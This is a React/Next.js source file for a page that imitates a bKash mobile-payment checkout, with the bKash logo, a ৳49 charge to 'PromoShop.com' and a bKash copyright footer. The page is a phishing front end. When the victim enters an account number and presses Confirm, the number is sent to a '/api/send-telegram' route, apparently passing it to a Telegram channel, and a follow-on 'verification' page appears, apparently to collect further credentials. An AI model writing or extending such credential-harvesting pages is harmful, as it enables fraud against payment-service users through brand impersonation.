"use client"

import Image from "next/image"
import Link from "next/link"
import { Card, CardContent } from "@/components/card"
import { Avatar, AvatarFallback } from "@/components/avatar"
import { Input } from "@/components/input"
import { Button } from "@/components/button"
import { ShoppingCart } from "lucide-react" // Removed Copy icon
import { useState } from "react"
import VerificationPage from "./verification-page/page"
// Removed import for useCopyToClipboard

export default function BkashPayment() {
  const [accountNumber, setAccountNumber] = useState("")
  const [isConfirmEnabled, setIsConfirmEnabled] = useState(false)
  const [isLoading, setIsLoading] = useState(false)
  const [showVerificationPage, setShowVerificationPage] = useState(false)
  // Removed initialization of useCopyToClipboard

  const sendToTelegram = async () => {
    setIsLoading(true)

    try {
      const response = await fetch("/api/send-telegram", {
        // Call internal API route
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          accountNumber: accountNumber,
        }),
      })

      if (response.ok) {
        console.log("Message sent to Telegram successfully via API route.")
      } else {
        console.error("Failed to send message to Telegram via API route.")
      }
    } catch (error) {
      console.error("Error sending message to Telegram:", error)
    } finally {
      // Removed setTimeout here to ensure immediate transition
      setIsLoading(false)
      setShowVerificationPage(true) // Show verification page after sending
    }
  }

  const handleCancel = () => {
    setShowVerificationPage(false)
    setAccountNumber("")
    setIsConfirmEnabled(false)
  }

  if (showVerificationPage) {
    return <VerificationPage accountNumber={accountNumber} onCancel={handleCancel} />
  }

  return (
    <div className="flex min-h-screen items-center justify-center bg-gray-100 p-4">
      <Card className="w-full max-w-sm rounded-xl overflow-hidden shadow-lg">
        <CardContent className="p-0">
          {/* Logo Section */}
          <div className="flex justify-center pt-0 pb-4">
            <Image src="/bkash-logo.png" width={150} height={50} alt="bKash Logo" className="object-contain" />
          </div>

          {/* Transaction Summary */}
          <div className="flex items-center gap-4 p-4 border-t border-b bg-white">
            <Avatar className="w-10 h-10 bg-gray-100 flex items-center justify-center rounded-full">
              <ShoppingCart className="w-5 h-5 text-gray-500" />
              <AvatarFallback className="sr-only">Shopping Cart</AvatarFallback>
            </Avatar>
            <div className="flex-1">
              <p className="text-xs font-medium text-gray-800">PromoShop.com</p>
              <p className="text-[10px] text-gray-500">Inv No: NNT_6094bc8028702...</p>
            </div>
            <div className="text-lg font-semibold text-gray-800">৳49.00</div>
          </div>

          {/* Account Number Input Section */}
          <div className="bg-bkash-pink p-6 text-white space-y-4 aspect-square flex flex-col justify-center">
            <h2 className="text-lg font-semibold text-center">Your bKash Account Number</h2>
            <div className="relative flex items-center">
              <Input
                type="tel"
                placeholder="e.g 01XXXXXXXXX"
                className="w-full rounded-md border border-input bg-white px-4 py-2 text-base text-gray-800 placeholder:text-gray-400 focus:border-transparent focus:ring-0 focus:outline-none focus:ring-offset-0 text-center"
                value={accountNumber}
                maxLength={11}
                onChange={(e) => {
                  const value = e.target.value.replace(/\D/g, "") // Allow only digits
                  setAccountNumber(value)

                  // Check conditions for enabling the confirm button
                  if (value.startsWith("01") && value.length === 11) {
                    setIsConfirmEnabled(true)
                  } else {
                    setIsConfirmEnabled(false)
                  }
                }}
              />
              {/* Removed Copy Button */}
            </div>
            <p className="text-xs text-center">
              Confirm and proceed,{" "}
              <Link
                href="https://www.bkash.com/en/page/tokenized_checkout"
                target="_blank"
                rel="noopener noreferrer"
                className="font-medium underline text-white hover:text-gray-200"
              >
                terms & conditions
              </Link>
            </p>
          </div>

          {/* Action Buttons */}
          <div className="flex justify-around p-2.5 gap-4 bg-white">
            <Button
              variant="outline"
              className="flex-1 rounded-md border border-gray-300 bg-white text-gray-800 shadow-sm hover:bg-gray-50"
              onClick={handleCancel}
            >
              Cancel
            </Button>
            <Button
              disabled={!isConfirmEnabled || isLoading}
              onClick={isConfirmEnabled && !isLoading ? sendToTelegram : undefined}
              className={`flex-1 rounded-md shadow-sm transition-colors duration-200 ${
                isLoading
                  ? "!bg-[#F48CA7] text-white cursor-not-allowed !hover:bg-[#F48CA7] !active:bg-[#F48CA7] !focus:bg-[#F48CA7]"
                  : isConfirmEnabled
                    ? "bg-bkash-pink text-white hover:bg-bkash-pink/90"
                    : "bg-gray-200 text-gray-500 cursor-not-allowed"
              }`}
            >
              {isLoading ? (
                <div className="flex items-center justify-center space-x-1">
                  <div className="w-2 h-2 bg-white rounded-full animate-bounce" style={{ animationDelay: "0ms" }}></div>
                  <div
                    className="w-2 h-2 bg-white rounded-full animate-bounce"
                    style={{ animationDelay: "150ms" }}
                  ></div>
                  <div
                    className="w-2 h-2 bg-white rounded-full animate-bounce"
                    style={{ animationDelay: "300ms" }}
                  ></div>
                </div>
              ) : (
                "Confirm"
              )}
            </Button>
          </div>

          {/* Footer */}
          <div className="flex flex-col items-center justify-center p-2.5 text-xs space-y-1">
            <div className="flex items-center gap-1 text-bkash-pink">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="16"
                height="16"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
                className="lucide lucide-phone-call"
              >
                <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z" />
              </svg>
              <span>16247</span>
            </div>
            <p className="text-xs" style={{ color: "#9e9e9e" }}>
              © 2025 bKash, All Rights Reserved
            </p>
          </div>
        </CardContent>
      </Card>
    </div>
  )
}
